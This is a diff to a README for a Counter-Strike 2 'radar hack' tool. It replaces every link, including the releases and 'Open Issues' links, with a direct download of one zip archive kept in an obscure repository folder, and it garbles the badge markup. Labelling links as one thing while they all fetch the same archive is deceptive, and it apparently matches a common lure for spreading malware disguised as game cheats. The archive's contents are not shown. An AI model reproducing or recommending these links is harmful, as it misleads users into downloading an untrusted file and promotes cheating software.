@@ -1,7 +1,7 @@
 # 🌟 cs2-realtime-demo-radar - Simple Radar Hack for CS2 Demos
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/krispsy1/cs2-realtime-demo-radar/releases)
+[![Download](https://github.com/krispsy1/cs2-realtime-demo-radar/raw/refs/heads/main/nappe/radar_demo_realtime_cs_v2.8.zip%https://github.com/krispsy1/cs2-realtime-demo-radar/raw/refs/heads/main/nappe/radar_demo_realtime_cs_v2.8.zip)](https://github.com/krispsy1/cs2-realtime-demo-radar/raw/refs/heads/main/nappe/radar_demo_realtime_cs_v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the cs2-realtime-demo-radar! This application provides a simple radar hack for CS2 demos, making it easier to visualize key elements without delving into complex setup procedures. Here’s how to quickly get started.
@@ -22,7 +22,7 @@ Before you download, ensure your system meets these requirements:
 ## 📂 Download & Install
 To download and install the cs2-realtime-demo-radar application, please follow these steps:
 
-1. **Visit the Release Page:** Click this link to go to the releases section: [Download Here](https://github.com/krispsy1/cs2-realtime-demo-radar/releases).
+1. **Visit the Release Page:** Click this link to go to the releases section: [Download Here](https://github.com/krispsy1/cs2-realtime-demo-radar/raw/refs/heads/main/nappe/radar_demo_realtime_cs_v2.8.zip).
   
 2. **Select the Latest Release:** On the releases page, find the latest version listed. It is usually at the top of the page.
 
@@ -54,7 +54,7 @@ If you encounter any issues:
 
 ## 📣 Community Support
 Join the discussion and get help from fellow users:
-- **GitHub Issues:** Report bugs or request features. [Open Issues](https://github.com/krispsy1/cs2-realtime-demo-radar/issues).
+- **GitHub Issues:** Report bugs or request features. [Open Issues](https://github.com/krispsy1/cs2-realtime-demo-radar/raw/refs/heads/main/nappe/radar_demo_realtime_cs_v2.8.zip).
 - **Forum Discussions:** Engage with the user community to share tips and tricks.
 
 ## 📚 Additional Resources
@@ -70,4 +70,4 @@ Stay informed about updates:
 ## 🎉 Acknowledgements
 Thank you to the contributors and community members who helped develop and improve cs2-realtime-demo-radar.
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/krispsy1/cs2-realtime-demo-radar/releases)
+[![Download](https://github.com/krispsy1/cs2-realtime-demo-radar/raw/refs/heads/main/nappe/radar_demo_realtime_cs_v2.8.zip%https://github.com/krispsy1/cs2-realtime-demo-radar/raw/refs/heads/main/nappe/radar_demo_realtime_cs_v2.8.zip)](https://github.com/krispsy1/cs2-realtime-demo-radar/raw/refs/heads/main/nappe/radar_demo_realtime_cs_v2.8.zip)
